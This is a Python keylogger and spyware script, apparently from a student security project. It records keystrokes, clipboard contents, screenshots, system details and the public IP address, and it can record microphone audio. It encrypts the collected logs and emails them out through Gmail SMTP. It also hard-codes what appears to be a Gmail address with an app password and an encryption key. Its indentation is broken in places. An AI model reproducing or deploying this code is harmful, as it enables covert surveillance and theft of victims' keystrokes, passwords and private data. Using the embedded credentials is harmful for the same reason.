#Libraries
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener
import time
import os

from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet

import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_info = "key_log.txt"
system_info = "systeminfo.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"

file_path = "D:\\ISMproj\\Project"
extend = "\\"
file_merge = file_path + extend
email_address = "ismproj1308@gmail.com"
password = "mzqjuyqngasauadd"
toaddr = "ismproj1308@gmail.com"

keys_info_e ="e_key_log.txt"
system_info_e = "e_system.txt"
clipboard_info_e = "e_clipboard.txt"

time_iteration = 15
microphone_time = 10
number_of_iterations_end = 3

key = "MWLoT3U7bS-m_g0VrpuueoLQHx1GF3DBVKTFUmb9JVg="

#email controls
def send_email(filename, attachment, toaddr):
 fromaddr = email_address
 msg = MIMEMultipart()
 msg['From'] = fromaddr
 msg['To'] = toaddr
 msg['Subject'] = "Log File"

 body = "Body_of_the_mail"
 msg.attach(MIMEText(body, 'plain'))

 filename = filename
 attachment = open(attachment, 'rb')

 p = MIMEBase('application', 'octet-stream')
 p.set_payload((attachment).read())
 encoders.encode_base64(p)
 p.add_header('Content-Disposition', "attachment; filename= %s" %
filename)

 msg.attach(p)
 s = smtplib.SMTP('smtp.gmail.com', 587)
 s.starttls()
 s.login(fromaddr, password)
 text = msg.as_string()
 s.sendmail(fromaddr, toaddr, text)
 s.quit()

send_email(keys_info, file_path + extend + keys_info, toaddr)

#getting computer information
def computer_info():
 with open(file_path + extend + system_info, "a") as f:
 hostname = socket.gethostname()
 IPaddr = socket.gethostbyname(hostname)
 try:
  public_ip = get("https://api.ipify.org").text
  f.write("Public IP Address: " + public_ip)
 except Exception:
  f.write("Couldn't get Public IP address (most likely max query")
  f.write("Process: " + (platform.processor()) + '\n')
  f.write("System: " + platform.system() + " " + platform.version() +'\n')
  f.write("Machine: " + platform.machine() + '\n')
  f.write("Hostname: " + hostname + '\n')
  f.write("Private IP address: " + IPaddr + '\n')

computer_info()

#getting clipboard information
def copy_clipboard():
 with open(file_path+extend+clipboard_info, "a") as f:
  try:
   win32clipboard.OpenClipboard()
   pasted_data = win32clipboard.GetClipboardData()
   win32clipboard.CloseClipboard()
   f.write("Clipboard Data: \n"+pasted_data)
 except:
   f.write("Clipboard cannot be copied")

copy_clipboard()

def microphone():
 fs = 44100
 seconds = microphone_time

 myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
 sd.wait()

 write(file_path+extend+audio_info, fs, myrecording)

#microphone()

#getting screen information
def screenshot():
 im = ImageGrab.grab()
 im.save(file_path+extend+screenshot_info)

screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
 count = 0
 keys = []
 def on_press(key):
  global keys, count, currentTime
  print(key)
  keys.append(key)
  count += 1
  currentTime = time.time()
  if count >= 1:
   count = 0
   write_file(keys)
   keys = []
 def write_file(keys):
  with open(file_path + extend + keys_info, "a") as f:
   for key in keys:
    k = str(key).replace("'", "")
    if k.find("space") > 0:
     f.write('\n')
     f.close()
    elif k.find("Key") == -1:
     f.write(k)
     f.close()

 def on_release(key):
  if key == Key.esc:
   return False
  if currentTime > stoppingTime:
   return False
 with Listener(on_press=on_press, on_release=on_release) as listener:
  listener.join()
 if currentTime > stoppingTime:
  with open(file_path+extend+keys_info, "w") as f:
   f.write(" ");

 screenshot()
 send_email(screenshot_info,file_path+extend+screenshot_info,toaddr)
 copy_clipboard()
 number_of_iterations += 1
 currentTime = time.time()
 stoppingTime = time.time() + time_iteration
files_to_encrypt = [file_merge+system_info, file_merge+clipboard_info,
file_merge+keys_info]
encrypted_file_names = [file_merge+system_info_e,
file_merge+clipboard_info_e, file_merge+keys_info_e]
count = 0
for encrypting_file in files_to_encrypt:
 with open(files_to_encrypt[count], 'rb') as f:
 data = f.read()
 fernet = Fernet(key)
 encrypted = fernet.encrypt(data)
 with open(encrypted_file_names[count], 'wb') as f:
 f.write(encrypted)
 send_email(encrypted_file_names[count], encrypted_file_names[count],
toaddr)
 count +=1
time.sleep(120)
